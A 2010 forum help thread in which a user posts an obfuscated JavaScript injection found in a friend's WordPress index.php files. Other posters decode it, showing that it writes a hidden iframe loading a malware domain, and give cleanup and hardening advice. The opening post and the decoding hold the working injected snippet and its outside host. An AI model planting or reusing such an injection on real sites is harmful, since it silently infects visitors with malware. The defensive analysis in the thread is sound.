---
title: "Can someone translate this script? (malicious script)"
date: 2010-07-05
forum: General Help
---

### Post by kenweill on 2010-07-05
Can someone translate this script? 

I'm working on a friend's website powered by Wordpress. His site is currently deactivated since hosting provider found out that his php file contains malicious codes.

Here's the code:
[PHP]<script>eval(unescape('%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%27%3C%69%66%72%61%6D%65%20%73%72%63%3D%22%68%74%74%70%3A%2F%2F%67%69%61%69%6E%65%2E%63%6F%6D%2F%3F%32%34%37%39%36%38%22%20%77%69%64%74%68%3D%31%20%68%65%69%67%68%74%3D%31%20%73%74%79%6C%65%3D%22%76%69%73%69%62%69%6C%69%74%79%3A%68%69%64%64%65%6E%3B%70%6F%73%69%74%69%6F%6E%3A%61%62%73%6F%6C%75%74%65%22%3E%3C%2F%69%66%72%61%6D%65%3E%27%29'));</script><!-- uy7gdr5332rkmn -->[/PHP]

This codes are found on all his index.php file with permissions 755. All other index.php file with permissions 644 don't have this code. Don't know why.

What does this code do? Is there a way to remove all these codes with one command or a script to scan for all index.php files and remove similar codes automatically, without compromising other codes within index.php file?

---

### Post by ankspo71 on 2010-07-05
Hi,
It looks like a form of unicode to hide the actual script from the administrator. Here is another person using wordpress having the same problem, and some people have given him/her help with it.
[http://www.google.com/support/forum/p/Webmasters/thread?tid=6f4cf473c414de1f&hl=en](http://www.google.com/support/forum/p/Webmasters/thread?tid=6f4cf473c414de1f&hl=en)
Hope that helps.

---

### Post by AleksKeaton on 2010-07-05
It looks like a virus. It got there because of the permissions being wrong. Have your friend set everything to read only to prevent this from happening again.

---

### Post by ankspo71 on 2010-07-05
It definitely is a virus!
I found out by going to [http://www.virustotal.com/](http://www.virustotal.com/) and uploaded a sample file with the code in it and 6/41 scanners confirmed it was a virus.

---

### Post by stderr on 2010-07-05
Unicode character values. The script tags means Javascript. It writes an invisible iframe into the page, and loads this web address: (**DO NOT VISIT THIS SITE!** - highly likely to contain malware) [http://giaine.COM_EDIT/?247968](http://giaine.COM_EDIT/?247968) (**DO NOT VISIT THIS SITE!**) edit: I decided to edit the URL here, I changed the .com to .COM_EDIT

%64%6F%63%75%6D%65%6E%74%2E
document.
%77%72%69%74%65%28%27%3C%69
write('<i
%66%72%61%6D%65%20%73%72%63
frame src
%3D%22%68%74%74%70%3A%2F%2F
="http://
%67%69%61%69%6E%65%2E%63%6F
giaine.co
%6D%2F%3F%32%34%37%39%36%38
m/?247968
%22%20%77%69%64%74%68%3D%31
" width=1
%20%68%65%69%67%68%74%3D%31
 height=1
%20%73%74%79%6C%65%3D%22%76
 style="v
%69%73%69%62%69%6C%69%74%79
isibility
%3A%68%69%64%64%65%6E%3B%70
:hidden;p
%6F%73%69%74%69%6F%6E%3A%61
osition:a
%62%73%6F%6C%75%74%65%22%3E
bsolute">
%3C%2F%69%66%72%61%6D%65%3E
</iframe>
%27%29
')

---

### Post by stderr on 2010-07-05
A quick whois lookup on the domain returns:

```
Registrar: PAKNIC (Pvt.) Limited [www.paknic.com]
Domain Status:

Registrant Name: Sam Foster
Registrant Organization: Foster Group LLC
Registrant Street1: 44 South Main Street
Registrant Street2: 
Registrant City: Greer
Registrant State/Province: SC
Registrant Postal Code: 29650
Registrant Country: US
Registrant Phone: 1.1
Registrant Phone Ext.: 
Registrant FAX: .
Registrant Email: saamfoster@slow8.mobi

```

Checks on sites that record malware on the net report many other fraudulent sites registered to Sam Foster, Foster Group LLC.

With regard to cleaning it, it looks like it could well have been the simplest of attacks (due to the brevity of the script), a plain simple [code injection]("http://en.wikipedia.org/wiki/Code_injection"), caused by a lack of input validation. In web apps especially, *all* input, *all* values that you use that a user *might just* be able to alter, *must* be properly validated/escaped. If it was an injection, then chances are the only damage is a) that string in some of your pages, which you could do a text search for, yes, and b) the people who have already contracted malware as a result of the iframe being embedded in the site.

---

### Post by kenweill on 2010-07-05
Thanks for all your replies and tips.

When the hosting provider took down his websites and disable his accounts, the hosting provider provided a list of .php files and .html files that needs cleaning for malicious codes and I'm done removing those malicious codes from their list.

Upon asking for reactivation, they provided file list that contains another file with malicious code. And removed it again. The last file permissions was even 644 which should be safe yet, still being injected with the code.

The provider are asking too many questions asking about what's been done to remove the malicious codes and what's been done to close the exploits. We've told them that malicious codes have been removed based on the file list they provided and still not enough reason that they would reactivate the account. Maybe they wanted to avoid future exploits. But how?

If the hacker may leave a script to reinfect .php and .html files, where should I be looking for this script?

---

### Post by ankspo71 on 2010-07-06
Hi,
The first thing I would do is change the password to the longest password possible using numbers and letters (both upper and lowercase if possible). It looks like that someone or something has login access, or there is still a script hidden somewhere at the host causing new scripts to be created. Try deleting everything from the host before reuploading. If there isn't a full backup to use, it is probably best to download the entire site for a thorough cleaning, then reupload it to the empty host (with a new and stronger password).

Security tips from wordpress:
[http://codex.wordpress.org/Hardening_WordPress](http://codex.wordpress.org/Hardening_WordPress)

Information about what to do in the event your blogpress was hacked:
[http://codex.wordpress.org/FAQ_My_site_was_hacked](http://codex.wordpress.org/FAQ_My_site_was_hacked)

As far as what to do about convincing the provider, I'm not sure what I would do.

---

### Post by stderr on 2010-07-06
Your friend's hosting provider is quite correct - I would most probably do the same if I owned the server. 

Removing the code from the list of files your provider has given you is step 1, sure, but that doesn't do anything to block the security holes in your friend's site (which are his responsibility to fix - the hosting provider can't be expected to read through all your friend's PHP code and provide security assessments! I would have thought the file lists they provided were generated automatically.)

As it stands, the attacker can simply replicate ***exactly*** what they did last time and achieve the same effect. And the result of what the attacker does is (most probably) that innocent people visiting your site will have their PCs infected with malware/viruses/trojans that may well result in data loss, identity theft, fraudulent bank use, etc. etc.

I don't mean to be harsh, but placing code on the web comes with a certain level of responsibility. The fact that your friend may not understand SQL injection, for example, doesn't help the people being silently infected (running Windows ;)). Installing a Wordpress blog is fine; that code is reviewed by loads of people, and so long as you keep updating it regularly you should be fine. You need to be careful with your own server-side code though (PHP/Perl/ASP/etc).

The very first rule with web design is to completely, entirely & comprehensively sanitise every bit of input to your server side scripts that could *conceivably* be altered by a unscrupulous user. 

If either of you are a bit rusty on web design/web security, I'd say it's imperative to read through a summary. I haven't looked, but I'd guess the Hardening Wordpress link posted by ankspo71 above is reasonable - such guides usually give a good overview of what you should be checking (after all, it's in the interests of the authors of the guides to be as comprehensive as possible).

Good luck, and happy code reviewing :)

---

### Post by kenweill on 2010-07-06
Indeed. ankspo71's post hardening wordpress was of great help.
I have been checking wp-config.php files of my friend's server and some permissions really sucks. And some keys, i don't know about it but I suspect someone else did change those.

Some wp-config.php files (as there are 32 since my friend have 32 sub domains) have permission 755, some, 644, I even encountered 777. 

Also, wp-config.php keys are supposed to be something like:

[PHP]
define('AUTH_KEY',        'KO$|MRB-AVp(=Tk?Te}O^N.1M6(?z+J^(18kh49=GZMG#YukSo;w$I-&(@L+Nwdh');
define('SECURE_AUTH_KEY', '{z+g&&nYgArP[-NT~pSQmV>YJRD%(79`# AW>!M0Wg#RY%_o7<P2-eoLBX0^#Yrk');
define('LOGGED_IN_KEY',   'au{[nKiX~b<n d{vdDl7VgY.0,p8nOa=dHY x%a;d}Qte`)n59#|ofUwho]Zme#o');
define('NONCE_KEY',       'WXwcKb]33e-czKt(FXrjinMMV]3NBF%-yj+or`n#VDR1Hz(ysK#)k8$T*%rsC6[%');
[/PHP]

but the contents that I have found on some his wp-config.php have this:

[PHP]
define('AUTH_KEY',        'the quick brown fox jumps over the lazy dog');
define('SECURE_AUTH_KEY', 'the quick brown fox jumps over the lazy dog');
define('LOGGED_IN_KEY',   'the quick brown fox jumps over the lazy dog');
define('NONCE_KEY',       'the quick brown fox jumps over the lazy dog');
[/PHP]

I asked him something about this and he didn't know who set the keys since he just hired someone else on the net to set-up his wordpress blog.

There was even one account from his previous worker that I have removed that can do ftp access to his sub directory.

---

### Post by kenweill on 2010-07-13
Problem solved.

We changed hosting company. The new hosting company fixed all problems for free. Removed all malicious javascripts for us. And initiate google review for the site to remove displaying Report Attack Page.

Thanks for all your help. I appreciate it.

---

